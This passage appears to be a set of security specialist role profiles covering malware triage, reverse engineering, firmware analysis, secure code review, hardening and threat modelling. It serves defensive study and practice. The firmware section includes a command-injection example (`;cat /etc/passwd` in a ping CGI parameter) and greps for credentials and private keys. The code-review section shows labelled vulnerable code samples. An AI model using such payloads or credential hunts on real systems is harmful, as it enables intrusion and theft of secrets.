# String extraction
strings malware.bin
strings -el malware.bin  # Unicode strings
floss malware.bin        # Decoded strings (FLOSS)

# PE analysis
pestudio malware.exe     # Windows (GUI)
pe-tree malware.exe
python -c "import pefile; pe=pefile.PE('malware.exe'); print(pe.dump_info())"

# Hash and threat intel lookup
sha256sum malware.bin | cut -d' ' -f1  # VirusTotal, MalwareBazaar
```

### Dynamic Analysis (Sandbox)
- **Any.run** — Interactive sandbox, MITRE ATT&CK mapping
- **Joe Sandbox** — Behavioral analysis, YARA, network
- **Cuckoo** — Self-hosted sandbox
- **CAPE** — Cuckoo fork with config extraction

### IOC Extraction Checklist
- [ ] File hashes (MD5, SHA1, SHA256)
- [ ] C2 IPs and domains (from network capture)
- [ ] Mutexes (prevent double execution)
- [ ] Registry keys (persistence)
- [ ] File paths created/modified
- [ ] Process injection targets
- [ ] Encrypted config (decode and document)

---

## reverse-engineer

### Role
Binary reverse engineering specialist — disassembly, decompilation, and understanding unknown binaries.

### Tool Selection
| Tool | Platform | Best For |
|---|---|---|
| IDA Pro | Win/Mac/Linux | Industry standard, best analysis |
| Ghidra | Win/Mac/Linux | Free, excellent decompiler (NSA) |
| Binary Ninja | Win/Mac/Linux | Modern API, scriptable |
| Radare2 / Cutter | Win/Mac/Linux | CLI-first, scriptable |
| x64dbg | Windows | Dynamic debugging |
| GDB + pwndbg | Linux | Linux debugging |

### Static Analysis with Ghidra
```
1. New Project → Import file
2. Auto-analyze (accept defaults)
3. Open CodeBrowser
4. Functions window → identify main(), interesting functions
5. Symbol Tree → look for suspicious imports
6. Search for strings: Search → For Strings
7. Follow cross-references (XREF) to find where strings are used
```

### Key Analysis Targets
- **Entry point** → Understand initialization
- **Network functions** → `send`, `recv`, `connect`, `WSAStartup` — find C2 comms
- **Crypto functions** → `CryptEncrypt`, `AES`, `XOR loops` — decode comms/config
- **Anti-analysis checks** → `IsDebuggerPresent`, timing checks, VM detection
- **Persistence mechanisms** → Registry writes, scheduled task creation, service installation

### Common Obfuscation Patterns
| Technique | Detection | Bypass |
|---|---|---|
| XOR encoding | Single-byte loop over data | Brute-force key, script decode |
| Custom base64 | Non-standard charset table | Identify table, implement decoder |
| Packing (UPX) | `UPX!` magic bytes | `upx -d packed.exe` |
| Custom packer | High entropy, small import table | Dump from memory after unpack |

---

## protocol-re

### Role
Network protocol reverse engineering — analyzing unknown or proprietary protocols from packet captures.

### Workflow
```
1. Capture traffic → Wireshark / tcpdump
2. Identify pattern → Fixed headers? Length fields? Magic bytes?
3. Find boundaries → How are messages framed?
4. Decode fields → Map byte offsets to logical fields
5. Implement parser → Python struct or Scapy
6. Validate → Confirm parser handles real traffic
```

### Wireshark Analysis
```bash
# Capture
tcpdump -i eth0 -w capture.pcap

# Filter in Wireshark
tcp.port == 4444          # Filter by port
tcp contains "MAGIC"       # Contains specific bytes
tcp.stream eq 5            # Follow specific stream

# Export stream data
Right-click → Follow → TCP Stream → Save as raw bytes
```

### Python Protocol Parser
```python
import struct

def parse_message(data: bytes):
    # Example: 4-byte magic, 2-byte message type, 4-byte length, N-byte payload
    magic, msg_type, length = struct.unpack('>4sHI', data[:10])
    payload = data[10:10+length]
    return {
        'magic': magic,
        'type': msg_type,
        'length': length,
        'payload': payload
    }
```

---

## anti-reversing

### Role
Anti-reversing technique analyst — understanding obfuscation, packing, anti-debug, and anti-VM to bypass them during analysis.

### Anti-Analysis Categories
| Technique | Purpose | Bypass |
|---|---|---|
| `IsDebuggerPresent` | Detect debugger | Patch bytes to always return 0 |
| Timing checks (RDTSC) | Detect slow debugging | Patch or skip timing check |
| Exception-based flow | Confuse disassemblers | Trace execution, not static analysis |
| VM detection | Detect sandbox | Use bare-metal or patch checks |
| Code packing | Encrypt code until runtime | Dump memory after unpack |
| Code virtualization | Replace instructions with VM bytecode | Hard — requires full VM analysis |
| Import obfuscation | Hide API calls | Dynamic analysis reveals calls |

### Bypassing IsDebuggerPresent
```asm
; Original:
; call IsDebuggerPresent
; test eax, eax
; jnz exit_if_debugger

; Patch: NOP the jump or force eax=0
; Option 1: Patch the conditional jump to NOP
; Option 2: Patch the function to always return 0
```

### Unpacking Strategy
1. Identify packer (PEiD, Detect-It-Easy)
2. Set hardware breakpoint on the OEP (original entry point) trick
3. Run until OEP is reached
4. Dump process memory (PE Dumper, Scylla)
5. Fix import table (Scylla)

---

## firmware-analyst

### Role
Firmware analysis specialist — extraction, filesystem unpacking, vulnerability hunting in embedded systems.

### Extraction Tools
```bash
# Identify firmware type
file firmware.bin
binwalk firmware.bin   # Detect embedded filesystems, compression

# Extract filesystem
binwalk -e firmware.bin         # Auto-extract
binwalk --dd='.*' firmware.bin  # Extract all signatures

# Manual extraction
dd if=firmware.bin bs=1 skip=<offset> count=<size> of=extracted.bin
unsquashfs filesystem.squashfs  # SquashFS (common in routers)
```

### Analysis Checklist
```bash
# After extraction
ls -la _firmware.bin.extracted/

# Find credentials
grep -r "password\|passwd\|secret\|key" --include="*.conf" .
grep -r "admin\|root\|default" etc/shadow etc/passwd 2>/dev/null

# Find hardcoded credentials in binaries
grep -r "password" --include="*.so" --include="*.elf" . 2>/dev/null

# Find web interfaces
find . -name "*.cgi" -o -name "*.php" -o -name "*.lua" 2>/dev/null

# Find private keys
find . -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
```

### Emulation (QEMU)
```bash
# For MIPS firmware
qemu-mips-static -L . ./bin/busybox sh

# Full system emulation
# Use FirmAE or QEMU system mode with extracted rootfs
```

### Common Firmware Vulnerabilities
- Hardcoded credentials (most common)
- Exposed telnet/SSH with default credentials
- Command injection in web interface (`ping.cgi?ip=;cat /etc/passwd`)
- Outdated Linux kernel with known CVEs
- Unencrypted firmware updates (allow modification)

---

## security-code-review

### Role
Security-focused code review specialist — identifying vulnerability patterns in source code before they reach production.

### Review Methodology
1. **Scope** — What attack surfaces exist? (input handling, auth, crypto, data storage)
2. **Data flow tracing** — Follow user input from entry point to storage/output
3. **Trust boundary mapping** — Where does user data cross a trust boundary?
4. **Pattern matching** — Known vulnerability patterns in the language/framework
5. **Business logic** — Are there authorization and workflow bypass possibilities?

### Vulnerability Patterns by Category

**Injection**
```python
# BAD — direct string concatenation
query = "SELECT * FROM users WHERE id = " + user_id
cursor.execute(query)

# GOOD — parameterized
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

**Insecure Deserialization**
```python
# BAD — never deserialize untrusted data with pickle
import pickle
data = pickle.loads(user_provided_bytes)  # RCE risk

# GOOD — use JSON with strict schema validation
import json
data = json.loads(user_provided_bytes)
# Validate against schema
```

**Path Traversal**
```python
# BAD
filename = user_input
open(f"/var/uploads/{filename}")

# GOOD
import os
safe_path = os.path.realpath(f"/var/uploads/{user_input}")
if not safe_path.startswith("/var/uploads/"):
    raise ValueError("Path traversal attempt")
```

### Review Checklist
- [ ] All user inputs validated and sanitized at trust boundaries
- [ ] SQL queries use parameterized statements
- [ ] File operations validate paths against allowed base directories
- [ ] Authentication checks on all sensitive endpoints
- [ ] Sensitive data not logged (passwords, tokens, PII)
- [ ] Error messages don't reveal stack traces or internal paths

---

## backend-security-coder

### Role
Secure backend development expert — building systems that are secure by design.

### Secure Authentication Pattern
```python
# Password storage (bcrypt minimum cost 12)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Session management
import secrets
session_token = secrets.token_urlsafe(32)  # 256-bit entropy

# JWT signing (use asymmetric RS256, not HS256 for multi-service)
import jwt
token = jwt.encode(payload, private_key, algorithm='RS256')
```

### Input Validation Layers
```
1. Type validation (is this an integer? a valid email format?)
2. Range validation (is this integer within expected bounds?)
3. Business rule validation (does this resource belong to this user?)
4. Sanitization (strip dangerous characters before storage/rendering)
```

### Secure Defaults Checklist
- [ ] HTTPS only (HSTS header with includeSubDomains)
- [ ] Security headers: CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
- [ ] Rate limiting on auth endpoints (login, registration, password reset)
- [ ] Bcrypt/Argon2id for passwords (never MD5, SHA-1, SHA-256 alone)
- [ ] Secrets in environment variables, not code
- [ ] Principle of least privilege for DB accounts

---

## api-security

### Role
API security expert — authentication, authorization, input validation, rate limiting, and threat protection.

### Authentication Mechanisms
| Method | Use Case | Notes |
|---|---|---|
| API Keys | Server-to-server, internal | Rotate regularly, scope by resource |
| Bearer tokens (JWT) | User-facing APIs | Short TTL (15min), refresh token rotation |
| OAuth 2.0 (Client Credentials) | B2B, machine-to-machine | PKCE for public clients |
| mTLS | High-security service mesh | Best for internal microservices |

### Authorization Patterns
```python
# Always verify at the resource level, not just endpoint level
def get_document(user_id: str, doc_id: str):
    doc = db.get_document(doc_id)
    if doc.owner_id != user_id:       # Resource-level check
        raise PermissionError(403)
    return doc
```

### Rate Limiting Strategy
```
Authentication endpoints: 5 requests/minute/IP (strict)
API endpoints (authenticated): 100 requests/minute/token
API endpoints (unauthenticated): 20 requests/minute/IP
Password reset: 3 requests/hour/email
```

### API Security Headers
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains
Cache-Control: no-store  (for sensitive endpoints)
```

---

## mobile-security

### Role
Mobile security specialist — iOS and Android secure coding, penetration testing, and security analysis.

### iOS Security Checklist
- [ ] **Certificate pinning** — Prevent MITM; use `NSURLSession` with custom `URLSessionDelegate`
- [ ] **Keychain storage** — Use Keychain for secrets (never `UserDefaults` for sensitive data)
- [ ] **Biometric auth** — `LocalAuthentication` framework with proper fallback handling
- [ ] **Jailbreak detection** — Check for common jailbreak paths (defense-in-depth)
- [ ] **Data protection** — `NSFileProtectionComplete` for sensitive files

### Android Security Checklist
- [ ] **Certificate pinning** — OkHttp `CertificatePinner` or Network Security Config
- [ ] **Encrypted storage** — Android Keystore + EncryptedSharedPreferences
- [ ] **Root detection** — RootBeer library (defense-in-depth)
- [ ] **ProGuard/R8** — Obfuscate release builds
- [ ] **Exported components** — Audit `exported=true` activities/services/receivers

### Mobile Pentest Tools
```bash
# iOS
frida-ps -Uia                    # List running processes
frida -U -n TargetApp -l hook.js # Dynamic instrumentation
objection -g TargetApp explore   # Runtime analysis

# Android
adb shell dumpsys package <pkg>  # Package info
adb shell am start <intent>      # Launch activities
jadx-gui app.apk                 # Decompile APK
apktool d app.apk                # Decode resources
```

---

## security-auditor

### Role
DevSecOps and application security audit specialist — OWASP ASVS, compliance frameworks, and security pipeline integration.

### Audit Scope Framework
```
Application Layer:
  - Authentication & session management
  - Authorization & access control
  - Input validation & output encoding
  - Cryptography implementation
  - Error handling & logging

Infrastructure Layer:
  - Network segmentation
  - TLS configuration
  - Container/OS hardening
  - Secrets management

Pipeline Layer:
  - SAST/DAST integration
  - Dependency scanning
  - Container image scanning
  - Secrets detection in CI
```

### OWASP ASVS Levels
| Level | Description | When Required |
|---|---|---|
| L1 | Automated verification | All applications |
| L2 | Standard security | Most applications |
| L3 | High-assurance | Financial, healthcare, critical |

### Compliance Mapping
| Framework | Key Controls |
|---|---|
| SOC 2 | Access control, availability, confidentiality, processing integrity |
| GDPR | Data minimization, consent, breach notification, right to erasure |
| HIPAA | Encryption at rest/transit, audit logging, access controls |
| PCI DSS | Network segmentation, encryption, vulnerability management, monitoring |

---

## sast-config

### Role
SAST (Static Application Security Testing) configuration specialist — setting up and tuning SonarQube, Semgrep, and CodeQL.

### Tool Comparison
| Tool | Languages | Strengths | Integration |
|---|---|---|---|
| Semgrep | 30+ | Fast, custom rules, OSS-friendly | CLI, CI, Cloud |
| SonarQube | 30+ | Comprehensive, technical debt | GitHub Actions, Jenkins |
| CodeQL | 20+ | Semantic analysis, GitHub native | GitHub Actions |
| Checkmarx | 25+ | Enterprise, compliance | Most CI/CD |

### Semgrep Quick Start
```yaml
# .semgrep.yml — custom rule
rules:
  - id: hardcoded-secret
    patterns:
      - pattern: $VAR = "..."
    metavariable-regex:
      metavariable: $VAR
      regex: '(?i)(password|secret|api_key|token)'
    message: Potential hardcoded secret in $VAR
    severity: ERROR
    languages: [python, javascript, typescript]
```

```bash
# Run Semgrep
semgrep --config=auto .                    # Auto-detect language + common rules
semgrep --config=p/security-audit .        # Security audit rules
semgrep --config=.semgrep.yml --json .     # Custom rules, JSON output
```

### CI/CD Integration (GitHub Actions)
```yaml
- name: Semgrep Scan
  uses: semgrep/semgrep-action@v1
  with:
    config: >-
      p/security-audit
      p/owasp-top-ten
    generateSarif: "1"
- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: semgrep.sarif
```

---

## dependency-audit

### Role
Dependency vulnerability scanning and supply chain security specialist.

### Tool Reference
```bash
# npm / Node.js
npm audit
npm audit --audit-level=high  # Fail CI on high/critical only
npx snyk test

# Python
pip install safety
safety check
pip install pip-audit
pip-audit

# Java / Maven
mvn dependency-check:check
./gradlew dependencyCheckAnalyze

# Universal (Snyk)
snyk test
snyk monitor  # Continuous monitoring
```

### SBOM Generation (Software Bill of Materials)
```bash
# npm
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Python
pip install cyclonedx-bom
cyclonedx-py -o sbom.json

# Docker images
syft nginx:latest -o cyclonedx-json > sbom.json
grype sbom:sbom.json  # Scan SBOM for vulnerabilities
```

### Dependency Security Policy
```
Block: CVSS >= 9.0 (Critical) — fail build immediately
Warn: CVSS 7.0–8.9 (High) — fail build after 7-day grace period
Track: CVSS 4.0–6.9 (Medium) — log and review monthly
Ignore: CVSS < 4.0 (Low/Info) — track only
```

---

## codebase-cleanup

### Role
Codebase security and quality cleanup — removing dead code, outdated dependencies, and security smells.

### Cleanup Checklist
- [ ] **Dead code removal** — Unreachable code paths, unused functions, commented-out code blocks
- [ ] **Dependency pruning** — `npm prune`, remove unused packages from requirements.txt
- [ ] **Hardcoded credential scan** — `git-secrets`, `truffleHog`, `gitleaks` — scan history too
- [ ] **Debug artifacts** — Remove debug endpoints, console.log of sensitive data, debug flags
- [ ] **TODO/FIXME security items** — Grep for `TODO:.*auth`, `FIXME:.*security`, `HACK:`
- [ ] **Outdated patterns** — MD5 for passwords, deprecated crypto, old auth patterns

### Secret Scanning
```bash
# gitleaks — scans git history
gitleaks detect --source .
gitleaks detect --source . --no-git  # Non-git scan

# trufflehog — deep git history scan
trufflehog git file://.

# Remove from git history if found (NUCLEAR — coordinate with team)
git filter-branch or BFG Repo Cleaner
```

---

## security-hardening

### Role
System and application hardening specialist — reducing attack surface across OS, web servers, containers, and databases.

### Linux Hardening
```bash
# Disable unused services
systemctl disable <service>
systemctl stop <service>

# Firewall (ufw)
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp  # SSH only from specific IPs: ufw allow from 10.0.0.0/8 to any port 22

# SSH hardening (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers deployuser

# Kernel hardening (/etc/sysctl.conf)
net.ipv4.ip_forward=0
net.ipv4.conf.all.accept_redirects=0
net.ipv4.tcp_syncookies=1
```

### Docker / Container Hardening
```dockerfile
# Non-root user
RUN adduser --disabled-password appuser
USER appuser

# Read-only filesystem where possible
# Set in docker-compose: read_only: true

# No privileged containers
# Explicitly drop capabilities
```

```yaml
# Kubernetes security context
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
  readOnlyRootFilesystem: true
```

### Web Server (Nginx) Hardening
```nginx
# Security headers
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubdomains; preload" always;
add_header Content-Security-Policy "default-src 'self'" always;

# Disable server version
server_tokens off;

# TLS configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
```

---

## stride-analysis

### Role
STRIDE threat modeling specialist — systematic threat identification, analysis, and mitigation planning.

### STRIDE Categories
| Threat | Violates | Example |
|---|---|---|
| **S**poofing | Authentication | Attacker impersonates legitimate user |
| **T**ampering | Integrity | Attacker modifies data in transit or at rest |
| **R**epudiation | Non-repudiation | User denies performing an action |
| **I**nformation Disclosure | Confidentiality | Sensitive data leaked to unauthorized party |
| **D**enial of Service | Availability | System overwhelmed, legitimate users blocked |
| **E**levation of Privilege | Authorization | User gains higher access than intended |

### STRIDE Workflow
```
1. Draw the Data Flow Diagram (DFD)
   - External entities (users, systems)
   - Processes (application components)
   - Data stores (databases, files)
   - Data flows (connections between above)
   - Trust boundaries (lines crossing privilege levels)

2. For each element, apply STRIDE threats

3. Rate each threat: Likelihood × Impact = Risk

4. Define mitigations per threat

5. Assign ownership and track to closure
```

### DFD Threat Focus Areas
| DFD Element | Primary STRIDE Threats |
|---|---|
| External Entity | Spoofing, Repudiation |
| Process | Tampering, Information Disclosure, Elevation of Privilege |
| Data Store | Tampering, Information Disclosure, Denial of Service |
| Data Flow | Tampering, Information Disclosure |
| Trust Boundary crossing | All — highest risk area |

### Output Format
For each threat:
```
Threat:       [STRIDE category]
Component:    [What is being threatened]
Description:  [How the attack works]
Risk:         [Critical / High / Medium / Low]
Mitigation:   [Specific control]
Owner:        [Team responsible]
Status:       [Open / In Progress / Mitigated]
```

---

## threat-mitigation

### Role
Threat mitigation mapping specialist — mapping threats to controls, measuring residual risk, and building defense-in-depth.

### Defense-in-Depth Model
```
Layer 1: Perimeter (WAF, DDoS protection, edge filtering)
Layer 2: Network (segmentation, firewall rules, IDS/IPS)
Layer 3: Application (input validation, auth, authorization)
Layer 4: Data (encryption at rest, field-level encryption, tokenization)
Layer 5: Identity (MFA, PAM, zero trust)
Layer 6: Detection (SIEM, logging, alerting)
Layer 7: Response (incident response plan, playbooks)
```

### Control Types
| Type | Description | Example |
|---|---|---|
| Preventive | Stop the attack | Input validation, authentication |
| Detective | Identify attacks in progress | SIEM alerts, anomaly detection |
| Corrective | Recover from attacks | Backups, incident response |
| Deterrent | Discourage attackers | Legal warnings, honeypots |
| Compensating | Alternative when primary control absent | MFA compensates for weak password policy |

### Residual Risk Calculation
```
Inherent Risk = Likelihood × Impact (before controls)
Control Effectiveness = 0–100% reduction
Residual Risk = Inherent Risk × (1 - Control Effectiveness)

Accept: Residual Risk < organizational risk appetite
Mitigate: Residual Risk > risk appetite → add controls
Transfer: Insure against accepted residual risk
Avoid: Eliminate the risky activity if mitigation is too costly
```

### Mitigation Roadmap Template
| Threat | Current Control | Gap | Recommended Control | Priority | Effort |
|---|---|---|---|---|---|
| SQLi | Partial input validation | Missing parameterization | Parameterized queries everywhere | Critical | Low |
| Credential stuffing | None | No rate limiting | Rate limit + CAPTCHA on login | High | Medium |
| Insider threat | None | No audit logging | SIEM + user behavior analytics | High | High |
